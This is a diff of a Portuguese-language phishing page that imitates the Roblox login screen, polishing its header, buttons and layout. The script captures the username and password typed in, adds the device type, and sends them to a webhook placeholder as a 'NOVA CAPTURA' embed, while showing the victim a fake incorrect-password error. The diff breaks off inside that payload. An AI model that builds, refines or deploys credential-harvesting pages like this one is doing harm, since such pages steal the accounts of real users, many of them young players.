@@ -10,245 +10,197 @@
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
         :root {
-            /* CORES QUE VOCÊ ENVIOU - ESCALA CINZA */
-            --bg-main: #121215;           /* color-extended-gray-1200 */
-            --bg-card: #191a1f;           /* color-extended-gray-1100 */
-            --bg-header: #202227;         /* color-extended-gray-1000 */
+            --bg-main: #121215;
+            --bg-card: #191a1f;
+            --bg-header: #202227;
             --input-bg: #121215;
-            
-            /* CORES DE INTERAÇÃO */
-            --rbx-blue: #335fff;          /* color-extended-blue-700 */
-            --rbx-blue-hover: #528bff;    /* color-extended-blue-600 */
-            --rbx-error: #df281f;         /* color-extended-red-800 */
-            
-            /* TIPOGRAFIA E BORDAS */
+            --rbx-blue: #335fff;
+            --rbx-blue-hover: #528bff;
+            --rbx-error: #df281f;
             --text-main: #ffffff;
             --text-muted: #bcbec8;
             --border-standard: rgba(255, 255, 255, 0.1);
             --radius-main: 8px;
         }
 
-        /* ANIMAÇÕES DE SISTEMA */
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        /* BARRA DE ROLAGEM CUSTOMIZADA */
+        ::-webkit-scrollbar { width: 14px; }
+        ::-webkit-scrollbar-track { background: var(--bg-card); }
+        ::-webkit-scrollbar-thumb { 
+            background: #65666a; 
+            border: 3px solid var(--bg-card); 
+            border-radius: 10px; 
         }
 
-        @keyframes shake { 
-            0%, 100% { transform: translateX(0); } 
-            25% { transform: translateX(-5px); } 
-            75% { transform: translateX(5px); } 
-        }
-
-        /* ESTRUTURA GLOBAL */
         body, html { 
-            margin: 0; 
-            padding: 0; 
-            min-height: 100%; 
+            margin: 0; padding: 0; height: 100%; width: 100%;
             font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif; 
-            background-color: var(--bg-main); 
-            color: var(--text-main); 
-            display: flex; 
-            flex-direction: column; 
-            overflow-x: hidden; 
+            background-color: var(--bg-main); color: var(--text-main);
+            overflow-x: hidden;
         }
 
-        /* CABEÇALHO OFICIAL */
+        /* CABEÇALHO OFICIAL REFINADO */
         .roblox-header { 
-            width: 100%; 
-            height: 44px; 
-            background: var(--bg-header); 
-            display: flex; 
-            align-items: center; 
-            padding: 0 16px; 
-            position: fixed; 
-            top: 0; 
-            z-index: 100; 
-            box-sizing: border-box; 
+            width: 100%; height: 44px; background: var(--bg-header); 
+            display: flex; align-items: center; padding: 0 16px; 
+            position: fixed; top: 0; z-index: 100; box-sizing: border-box; 
             border-bottom: 1px solid var(--border-standard); 
         }
 
+        .header-left { display: flex; align-items: center; flex-grow: 1; }
+
         .roblox-logo { 
-            height: 28px; 
-            width: 28px; 
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); 
-            background-size: contain; 
-            background-repeat: no-repeat; 
+            height: 28px; width: 28px; fill: white; cursor: pointer; margin-right: 12px;
         }
 
-        /* CONTEÚDO COM GRADIENTE DINÂMICO */
+        .nav-links {
+            display: flex; gap: 24px; font-size: 15px; font-weight: 500; color: #fff;
+            align-items: center;
+        }
+
+        .nav-links span { cursor: pointer; transition: opacity 0.2s; }
+        .nav-links span:hover { opacity: 0.8; }
+
+        /* BARRA DE PESQUISA */
+        .search-container {
+            margin-left: 20px; position: relative; width: 280px;
+        }
+
+        .search-bar {
+            background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 4px; height: 28px; width: 100%; display: flex; align-items: center; 
+            padding: 0 35px 0 10px; box-sizing: border-box; color: #fff; font-size: 13px;
+        }
+
+        .search-icon {
+            position: absolute; right: 10px; width: 16px; height: 16px; 
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>') no-repeat center;
+            opacity: 0.7;
+        }
+
+        /* BOTÕES DO CABEÇALHO (O QUE FALTAVA) */
+        .header-right { display: flex; align-items: center; gap: 8px; }
+
+        .btn-header-signup {
+            background-color: var(--rbx-blue); color: white; border: none;
+            padding: 5px 14px; border-radius: 6px; font-weight: 600; font-size: 14px;
+            cursor: pointer; transition: background 0.2s; white-space: nowrap;
+        }
+
+        .btn-header-signup:hover { background-color: var(--rbx-blue-hover); }
+
+        .btn-header-login {
+            background: transparent; color: white; border: 1px solid white;
+            padding: 4px 14px; border-radius: 6px; font-weight: 600; font-size: 14px;
+            cursor: pointer; transition: background 0.2s; white-space: nowrap;
+        }
+
+        .btn-header-login:hover { background: rgba(255,255,255,0.1); }
+
+        /* CONTEÚDO PRINCIPAL */
         .main-content { 
-            flex: 1; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            flex-direction: column; 
-            background: linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.45)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
-            background-size: cover; 
-            background-position: center; 
-            padding: 80px 0 40px 0; 
+            min-height: 100vh; display: flex; align-items: center; justify-content: center; 
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
+            background-size: cover; background-position: center; padding-top: 44px;
         }
 
-        /* CARD DE LOGIN PRO */
         .login-card { 
-            background-color: var(--bg-card); 
-            padding: 40px 32px; 
-            border-radius: var(--radius-main); 
-            width: 400px; 
-            text-align: center; 
-            box-shadow: 0 12px 40px rgba(0,0,0,0.7); 
-            box-sizing: border-box; 
-            position: relative; 
-            backdrop-filter: blur(12px); 
+            background-color: var(--bg-card); padding: 40px 32px; border-radius: var(--radius-main); 
+            width: 420px; text-align: center; box-shadow: 0 12px 50px rgba(0,0,0,0.8); 
+            box-sizing: border-box; position: relative; border: 1px solid rgba(255,255,255,0.05);
         }
 
-        .shield-icon { 
-            background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat center; 
-            background-size: 60px; 
-            width: 80px; 
-            height: 80px; 
-            margin: 0 auto 12px; 
-        }
+        h1 { margin-bottom: 28px; font-weight: 700; font-size: 28px; color: #fff; letter-spacing: -0.5px; }
 
-        h1 {
-            margin-bottom: 24px;
-            font-weight: 700;
-            font-size: 24px;
-            color: #fff;
-        }
-
-        /* MENSAGEM DE ERRO COM DESIGN DE ALERTA */
-        #error-msg { 
-            color: var(--rbx-error); 
-            font-size: 13px; 
-            margin-bottom: 15px; 
-            display: none; 
-            text-align: left; 
-            background: rgba(223, 40, 31, 0.1); 
-            padding: 12px; 
-            border-radius: 4px; 
-            border-left: 3px solid var(--rbx-error); 
-        }
-
-        /* CAMPOS DE INPUT */
         .input-field { 
-            width: 100%; 
-            height: 44px; 
-            background-color: var(--input-bg); 
-            border: 1px solid var(--border-standard); 
-            border-radius: 4px; 
-            color: #fff; 
-            padding: 0 12px; 
-            margin-bottom: 12px; 
-            box-sizing: border-box; 
-            outline: none; 
-            transition: all 0.2s ease; 
-            font-size: 15px; 
+            width: 100%; height: 48px; background-color: var(--input-bg); 
+            border: 1px solid rgba(255,255,255,0.15); border-radius: 6px; color: #fff; 
+            padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; 
+            transition: all 0.2s ease; font-size: 16px; 
         }
 
-        .input-field:focus { 
-            border-color: #fff; 
-        }
+        .input-field:focus { border-color: #fff; background-color: #1d1d22; }
 
-        /* BOTÃO PRIMÁRIO (AZUL FOUNDATION) */
         .btn-primary { 
-            width: 100%; 
-            height: 42px; 
-            background-color: var(--rbx-blue); 
-            color: #fff; 
-            border: none; 
-            border-radius: var(--radius-main); 
-            font-size: 16px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-top: 10px; 
-            transition: background 0.2s ease; 
+            width: 100%; height: 46px; background-color: var(--rbx-blue); color: #fff; 
+            border: none; border-radius: 6px; font-size: 17px; 
+            font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s ease; 
         }
 
-        .btn-primary:hover { 
-            background-color: var(--rbx-blue-hover); 
+        .btn-primary:hover { background-color: var(--rbx-blue-hover); }
+
+        #error-msg { 
+            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
+            text-align: left; background: rgba(223, 40, 31, 0.15); padding: 12px; 
+            border-radius: 4px; border-left: 4px solid var(--rbx-error); 
         }
 
-        /* BOTÃO SECUNDÁRIO */
-        .btn-secondary {
-            width: 100%;
-            height: 42px;
-            background: #393b43;
-            border: none;
-            color: #fff;
-            border-radius: var(--radius-main);
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .btn-secondary:hover {
-            background: #45474d;
-        }
-
-        /* OVERLAY DE CARREGAMENTO */
         #loading-overlay { 
-            background-color: rgba(0,0,0,0.85); 
-            position: fixed; 
-            inset: 0; 
-            z-index: 2000; 
-            display: none; 
-            align-items: center; 
-            justify-content: center; 
-            backdrop-filter: blur(6px); 
+            background-color: rgba(0,0,0,0.9); position: fixed; inset: 0; z-index: 2000; 
+            display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px); 
         }
 
         .spinner { 
-            width: 44px; 
-            height: 44px; 
-            border: 4px solid rgba(255,255,255,0.1); 
-            border-top: 4px solid var(--rbx-blue); 
-            border-radius: 50%; 
-            animation: spin 0.8s linear infinite; 
+            width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.1); 
+            border-top: 5px solid var(--rbx-blue); border-radius: 50%; animation: spin 0.8s linear infinite; 
         }
 
-        .shake { 
-            animation: shake 0.2s ease-in-out 0s 2; 
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
+        .shake { animation: shake 0.2s ease-in-out 0s 2; }
     </style>
 </head>
 <body>
 
-    <!-- ELEMENTO DE CARREGAMENTO -->
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-    </div>
+    <div id="loading-overlay"><div class="spinner"></div></div>
 
-    <!-- CABEÇALHO -->
+    <!-- CABEÇALHO REPLICADO DA IMAGEM -->
     <header class="roblox-header">
-        <div style="padding-left:10px">
-            <div class="roblox-logo"></div>
+        <div class="header-left">
+            <svg class="roblox-logo" viewBox="0 0 28 28">
+                <path d="M7.05 4L24 7.05 20.95 24 4 20.95 7.05 4zM11.5 16.5h5v-5h-5v5z"/>
+            </svg>
+            <div class="nav-links">
+                <span>Destaques</span>
+                <span>Mercado</span>
+                <span>Criar</span>
+                <span>Robux</span>
+                <div class="search-container">
+                    <div class="search-bar">Pesquisar</div>
+                    <div class="search-icon"></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- BOTÕES DO CANTO DIREITO (CADASTRAR E ENTRAR) -->
+        <div class="header-right">
+            <button class="btn-header-signup">Cadastrar-se</button>
+            <button class="btn-header-login">Entrar</button>
         </div>
     </header>
 
-    <!-- CONTEÚDO CENTRAL -->
     <main class="main-content">
         <div class="login-card" id="card">
-            <div class="shield-icon"></div>
             <h1>Entrar na Roblox</h1>
             
-            <!-- ALERTA DE ERRO -->
             <div id="error-msg">Usuário ou senha incorretos. Por favor, tente novamente.</div>
 
-            <!-- FORMULÁRIO -->
-            <input type="text" id="user" class="input-field" placeholder="Usuário / E-mail / Telefone" autocomplete="off" oninput="resetStyles()">
+            <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off" oninput="resetStyles()">
             <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
             
             <button class="btn-primary" onclick="execLogin()">Entrar</button>
 
-            <!-- DIVISOR E ENTRADA RÁPIDA -->
-            <div style="margin-top:24px; border-top:1px solid var(--border-standard); padding-top:20px">
-                <button class="btn-secondary">Entrada rápida</button>
+            <div style="margin-top:20px; font-size: 14px;">
+                <a href="#" style="color: #bcbec8; text-decoration: none;">Esqueceu a senha ou nome de usuário?</a>
             </div>
 
-            <!-- RODAPÉ DO CARD -->
-            <p style="margin-top:25px; font-size:14px; color: var(--text-muted)">
-                Não tem uma conta? 
+            <div style="margin-top:24px; border-top:1px solid var(--border-standard); padding-top:20px; display: flex; flex-direction: column; gap: 12px;">
+                <button style="width:100%; height:42px; background:#393b43; border:none; color:#fff; border-radius:6px; font-weight:600; cursor:pointer;">Envie-me um código único por e-mail</button>
+                <button style="width:100%; height:42px; background:#393b43; border:none; color:#fff; border-radius:6px; font-weight:600; cursor:pointer;">Entrada rápida</button>
+            </div>
+
+            <p style="margin-top:25px; font-size:15px; color: var(--text-muted)">
+                Não possui uma conta? 
                 <a href="#" style="color:#fff; text-decoration:none; font-weight:700">Cadastrar-se</a>
             </p>
         </div>
@@ -256,16 +208,14 @@
 
     <script>
         let attempt = 0;
-        const webhookURL = "SUA_WEBHOOK_AQUI"; // COLOQUE SUA URL AQUI
+        const webhookURL = "SUA_WEBHOOK_AQUI"; 
 
-        // LIMPA OS ERROS AO DIGITAR
         function resetStyles() {
             const inputs = document.querySelectorAll('.input-field');
-            inputs.forEach(i => i.style.borderColor = 'rgba(255, 255, 255, 0.1)');
+            inputs.forEach(i => i.style.borderColor = 'rgba(255, 255, 255, 0.15)');
             document.getElementById('error-msg').style.display = 'none';
         }
 
-        // LÓGICA DE LOGIN COM PROTOCOLO DE REDE
         async function execLogin() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
@@ -273,14 +223,9 @@
             const errorDiv = document.getElementById('error-msg');
             const overlay = document.getElementById('loading-overlay');
 
-            if (!u || !p) { 
-                triggerError(); 
-                return; 
-            }
+            if (!u || !p) { triggerError(); return; }
 
             overlay.style.display = 'flex';
-
-            // DETECÇÃO DE AGENTE DE USUÁRIO (O QUE ESTAVA FALTANDO)
             const device = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
 
             try {
@@ -289,7 +234,7 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🍯 NOVA CAPTURA | PROTOCOLO COLMEIA",
+                            title: "🍯 NOVA CAPTURA | PROTOCOLO FOUNDATION",
                             color: 3366911,
                             fields: [
                                 { name: "👤 Identificador", value: "
